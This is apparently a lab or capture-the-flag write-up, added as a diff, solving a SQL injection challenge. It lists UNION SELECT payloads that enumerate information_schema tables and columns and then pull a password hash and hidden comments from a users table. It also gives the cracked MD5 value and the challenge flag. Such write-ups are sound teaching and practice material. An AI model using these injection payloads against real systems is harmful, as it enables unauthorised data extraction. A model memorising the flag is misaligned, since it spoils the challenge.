@@ -1,0 +1,19 @@
+1 UNION select username from user
+    -> "Table 'Member_Sql_Injection.user' doesn't exist"
+
+We should have the same amount of table in each select, so use null to simaulate columns number
+    -> '1 UNION SELECT TABLE_NAME, null FROM information_schema.TABLES'
+    -> '1 UNION SELECT TABLE_NAME, column_name FROM information_schema.COLUMNS'
+
+    1 UNION SELECT countersign, first_name FROM users
+    
+    Flag
+    5ff9d0165b4f92b14994e5c685cdce28
+
+    md5 decrypt:
+    5ff9d0165b4f92b14994e5c685cdce28 = FortyTwo
+
+    1 UNION SELECT Commentaire, first_name FROM users
+        First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+        Surname : Flag
+
